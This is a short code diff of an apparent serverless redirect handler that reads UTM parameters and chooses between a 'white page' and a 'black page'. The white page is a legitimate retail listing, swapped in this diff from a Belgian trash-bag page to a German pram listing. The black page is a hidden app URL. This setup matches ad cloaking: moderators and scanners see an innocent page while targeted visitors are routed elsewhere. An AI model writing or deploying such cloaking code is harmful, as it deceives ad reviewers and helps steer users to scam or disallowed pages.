@@ -1,6 +1,6 @@
 export default function handler(req, res) {
     // URLs to redirect
-    const whitePageURL = "https://www.biopack.be/en/garba0030-doos-transparent-trash-bags-in-recycled-ldpe-30-litres";
+    const whitePageURL = "https://www.otto.de/p/lionelo-kombi-kinderwagen-bianka-3-in-1-set-3in1-erschwinglicher-hochwertiger-kinderwagen-S0O8501F/";
     const blackPageURL = "https://nowhereher.lovable.app/";
   
     // Parse the UTM parameters from the request URL
@@ -25,6 +25,7 @@ export default function handler(req, res) {
   
     res.end();
   }
+
 
 
 
